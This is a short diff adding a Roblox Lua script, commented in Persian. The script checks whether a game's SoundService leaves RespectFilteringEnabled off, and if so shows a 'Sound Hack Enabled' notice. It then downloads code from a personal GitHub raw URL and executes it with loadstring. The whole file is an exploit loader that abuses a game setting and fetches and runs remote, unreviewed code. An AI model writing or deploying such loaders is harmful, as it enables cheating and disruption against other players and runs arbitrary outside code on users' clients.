@@ -1,0 +1,24 @@
+local SoundService = game:GetService("SoundService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- بررسی وضعیت RespectFilteringEnabled
+if not SoundService.RespectFilteringEnabled then
+    
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Vulnerability Detected",
+    Text = "Sound Hack Enabled"
+})
+    
+    -- لود کردن اسکریپت از گیت‌هاب تو
+    local scriptUrl = "https://raw.githubusercontent.com/ermiya1231/Script1/refs/heads/main/script532"
+    
+    -- استفاده از pcall برای جلوگیری از ارور در صورت لود نشدن لینک
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(scriptUrl))()
+    end)
+    
+    if not success then
+        warn("Error loading the script: " .. tostring(err))
+    end
+    end
